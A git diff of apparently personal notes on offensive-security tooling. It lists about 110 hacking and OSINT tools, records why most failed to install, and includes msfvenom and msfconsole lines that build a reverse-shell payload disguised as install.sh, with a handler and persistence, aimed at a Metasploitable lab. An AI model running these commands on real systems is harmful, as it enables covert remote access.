@@ -1,22 +1,23 @@
+# Safe Behaviors
 B2G: NIST[180025,800171,800172,80053,CSF], KISMS, BNMRMiT, NZISM, GxPEUAnnex11, CCCS, 
 GrammLeachBlileyAct, NERCCIPBCSI, PCIDSS, MASTRMG, ACSCISM, APRACPG234, CMMC[Level1-5], 
 NCSCCAF, FFIEC, HIPAA, CCNENS, NYDFS23NYCRR500, ENISACybersecurityGuide, ABSCCIGv2,
 RBIMasterDirection, FedRAMP, MASNotice655, BCPandDR, CISACyberEssentials, NBCTRMG,
 FDA21CFRPart11, CISAWSFBv1.3, ACSCISM, ACSCEssential8, NCSCCloudSecPrinciples.
 
-3 januari 2020 : 111 broken apps. : 17 successful hacking apps. No previous knowledge about IT before. Script Kiddie.
+January 3, 2020. 111 broken apps. : 17 successful hacking apps. No previous knowledge about IT before. Script Kiddie. Prevention: [ ESLint, IDE plugins, and GitHub Actions ], [ MFA, password rotation, and separate browsers ], [ Black list, SPF, DKIM, and DMARC ].
 
-1. Metasploit-framevork 2. Recon-ng 3. BabySploit 4. Dirbuster 5. Grabber 6. BurpSuite 7. Golismero 8. MITRT 9. Tornado 10. Weevely 
-11. WPScan 12. theHarvester 13. theMole 14. Yasuo 15. Lazy 16. Katoolin 17. DVWA 18. Corsy 19. Armitage 20. BeEF 21. Eaphammer 
-22. Fluxion 23. Gophish 24. Ngrok 25. Pdfbook 26. Sqid 27. Autopsy 28. Binwalk 29. Bulk_extractor 30. Dradis 31. Dmitry 32. Magic-Tree 
-33. Facebookosint 34. Facebook-Location 35. Creepy 36. Ferret 37. Hamster-sidejack 38. Vulnhub 39. Airgedden 40. Airoscript 41. Catphish 
-42. Xsser 43. XSpear 44. Crackle 45. Crunch 46. Dawnscanner 47. Wafp 48. Dirb 50. Exploitpack 51. Fierce 52. Fimap 53. Foremost 
-54. Galleta 55. Giskismet 56. Httrack 57. OpenVAS  58. Maltego 59. Tor 60. I2P 61. ParamPamPam 62. Photos 63. Rekall 64. Scapy 
-65. Scrapy 66. SMTP2GO 67. TheFatRat 68. U3-Pwn 69. Usbris 70. Vega 71. Valnx 72. Volatility 73. W3af 74. W13Scan 75. Webhandler 
-76. WebSlayer 77. Websploit 78. WhatBreach 79. XssScan 80. Weeman 81. Spiderfoot 82. Dnmap 83. Automater 84. Arachni 85. Gobuster 
-86. ProxyStrike 87. Webshag 88. DotDotPwn 89. Skipfish 90. Cups 91. Spf 92. WhatWeb 93. Pwnat 94. ONSChef 95. Parsero  96. XssStrike  
-97. Xplice 98. OSIF 99. DNSRecon 100. Wafw00f 101. Masscan 102. Legion 103. Iodine 104. Cadaver 105. Laudanum 106. Hfind FLS 107.
-98. InSpy 108. OSINT-Spy 109. ReconCobra 110. Inquisitor 111. PhoneInfoga 112.
+* 1. Metasploit-framevork 2. Recon-ng 3. BabySploit 4. Dirbuster 5. Grabber 6. BurpSuite 7. Golismero 8. MITRT 9. Tornado 10. Weevely 
+* 11. WPScan 12. theHarvester 13. theMole 14. Yasuo 15. Lazy 16. Katoolin 17. DVWA 18. Corsy 19. Armitage 20. BeEF 21. Eaphammer 
+* 22. Fluxion 23. Gophish 24. Ngrok 25. Pdfbook 26. Sqid 27. Autopsy 28. Binwalk 29. Bulk_extractor 30. Dradis 31. Dmitry 32. Magic-Tree 
+* 33. Facebookosint 34. Facebook-Location 35. Creepy 36. Ferret 37. Hamster-sidejack 38. Vulnhub 39. Airgedden 40. Airoscript 41. Catphish 
+* 42. Xsser 43. XSpear 44. Crackle 45. Crunch 46. Dawnscanner 47. Wafp 48. Dirb 50. Exploitpack 51. Fierce 52. Fimap 53. Foremost 
+* 54. Galleta 55. Giskismet 56. Httrack 57. OpenVAS  58. Maltego 59. Tor 60. I2P 61. ParamPamPam 62. Photos 63. Rekall 64. Scapy 
+* 65. Scrapy 66. SMTP2GO 67. TheFatRat 68. U3-Pwn 69. Usbris 70. Vega 71. Valnx 72. Volatility 73. W3af 74. W13Scan 75. Webhandler 
+* 76. WebSlayer 77. Websploit 78. WhatBreach 79. XssScan 80. Weeman 81. Spiderfoot 82. Dnmap 83. Automater 84. Arachni 85. Gobuster 
+* 86. ProxyStrike 87. Webshag 88. DotDotPwn 89. Skipfish 90. Cups 91. Spf 92. WhatWeb 93. Pwnat 94. DNSChef 95. Parsero  96. XssStrike  
+* 97. Xplico 98. OSIF 99. DNSRecon 100. Wafw00f 101. Masscan 102. Legion 103. Iodine 104. Cadaver 105. Laudanum 106. Hfind FLS 107.
+* 98. InSpy 108. OSINT-Spy 109. ReconCobra 110. Inquisitor 111. PhoneInfoga 112.
 
 What worked for me with USB boot. 1. Remot3d, 2. IndoXploit, 3. XAttacker, 4. SQLMap, 5. Pappy, 6. Mitmproxy, 7. Arjun, 8. Commix, 9. Autosploit, 10. Witchxtool, 11. Mitmweb, 12. Poly, 13. Parameth, 14. Docem, 15. Chankro, 16. Wafninja, 17. Wafpass
 ```
@@ -117,20 +118,21 @@ msfconsole is a toolkit for embedding payloads to induce reverse shell of binari
 metasploitable 3 in virtualbox && msfvenom -p linux/x86/shell/reverse_tcp LHOST=ip LPORT=80 -e ruby/base64 -f bash -n 26 > install.sh
 msfconsole, use exploit/multi/handler, set payload linux/x86/shell/reverse_tcp, show options, set LHOST=ip, exploit,, run persistence -h   
 
-1. 746 issues, Gemfile.lock nokogiri. 2. API nycklar, funktion inte värt priset 3. Minimal funktion/begränsad 4. Java är problematiskt 
-5. Minimal funktion/begränsad 6. Java ar problematiskt 7-9. For många referenser till andra verktyg 10. Systemkollaps 11. Gemfile.lock
-12. Minimal funktion 13. Machinery modulen finns inte 14. Syntax error 15. For manga referenser till ... 16. /apt/sources.list
-17. Raderar mysql.socket av misstag 18. Syntax error 19. Baserad pá Metasploit 20. Browsern syns inte på panelen, packet storm
-21. Hostapd, no pem, certifikat problem 22. Mdk3, fake AP. packet storm 23. Config.json gulp. visas inte pá webben, docker build tag
-24. API nyckel, funktion inte värt priset 25. Syntax error 26. /apt/sources.list 27-32. Minimal funktion 30. For många referencer ...
-33-34. Syntax error 35. Systemkollaps 36-37. Pipe kollaps 38. Too big for virtualbox 39. For många referenser ... 40. Systemkollaps 
-41. Nokogiri, Trollo api for trollop 42. Syntax error 43. Bundle install, Gemtle lock 44. Systemkollaps 45. Minimal funktion 
-46. Bundle install, Gemfile.lock 47. Syntax error 48. Wordlists 49. x 50. Java ar problematiskt 51. Minimal funktion
-52. Baserad pá Metaspioit 53. Minimal funktion 54. unknown (x) 55. Baserad pâ Kismet, drivrutin error 56 För gammal  
-57. Certificat error, snarlik med BeEF och BurpSuite 58 API nycklar funktion into várt priset 59-60. For gammal 61. Error in GET 
-62. AttributeError 63 Virtualenv de into värt besváret 64. Six modulen finns into 65. No Sphinx modul 66. For gammal 
-67. Java ar problematiskt 68. unknown (x) 69. Virtualenv àr into värt besväret 70. 349 issues, Gemfile.lock 71. AttributeError 
-72. For gammal 73-80. Systemkollaps 81. For gammal 82. Minimal funktion 83. Baserad pá Metasploit 84. API nycklar, inte várt priset 
-85. SSL issues 86. Java ar problematiskt 87. Systemkollaps 88. Syntax error 31. Minimal funktion 89. For gammal, MIME db är död  
-90. Unknown (x) 91. For gammal 92. SSL issues  93. Stdlib.h (c++) finns inte 94 TypeError between 'str' och 'bool' 95 For gammal  
-96. TypeError objekt stöds into for signering 97. GeolPrangz finns into, HTTP 404 98. Minimal funktion 
+1. 746 issues, Gemfile.lock nokogiri. 2. API not worth the cost 3. Minimal function/limited 4. Java
+5. Minimal function/limited 6. Java 7-9. Too many dependencies 10. System collapse 11. Gemfile.lock
+12. Minimal function 13. Machinery module not exist 14. Syntax error 15. Dependencies ... 16. /apt/sources.list
+17. Deletes mysql.socket 18. Syntax error 19. Based on Metasploit 20. Browser is not on the panel, packet storm
+21. Hostapd, no pem, certificate problem 22. Mdk3, fake AP. packet storm 23. Config.json gulp. not online
+24. API not worth the cost 25. Syntax error 26. /apt/sources.list 27-32. Minimal function 33-34. Syntax error
+30. Dependencies 35. System collapse 36-37. Pipe kollaps 38. Too big for virtualbox 39. Dependencies 
+40. System collapse 41. Nokogiri, Trollo API for trollop 42. Syntax error 43. Bundle install, Gemfile lock 
+44. System collapse 45. Minimal function 46. Bundle install, Gemfile.lock 47. Syntax error 48. Wordlists 
+49. unknown (x) 50. Java 51. Minimal function 52. Based on Metaspioit 53. Minimal function 54. unknown (x) 
+55. Based on Kismet, drive routine error 56 Too old 57. Certificate error, resembles BeEF / BurpSuite
+58. API not worth the cost 59-60. Too old 61. Error in GET 62. AttributeError 63 Virtualenv 
+64. Six module not exist 65. No Sphinx module 66. Too old 67. Java 68. unknown (x) 69. Virtualenv 
+70. 349 issues, Gemfile.lock 71. AttributeError 72. Too old 73-80. System collapse 81. Too old 
+82. Minimal function 83. Based on Metasploit 84. API not worth the cost 85. SSL issues 86. Java 
+87. System collapse 88. Syntax error 31. Minimal function 89. MIME db is deprecated 90. Unknown (x) 
+91. Too old 92. SSL issues  93. Stdlib.h (c++) not exist 94 TypeError between 'str' och 'bool' 95 Too old  
+96. TypeError not supported for signing 97. GeoLite mmdb not exist, HTTP 404 98. Minimal function 
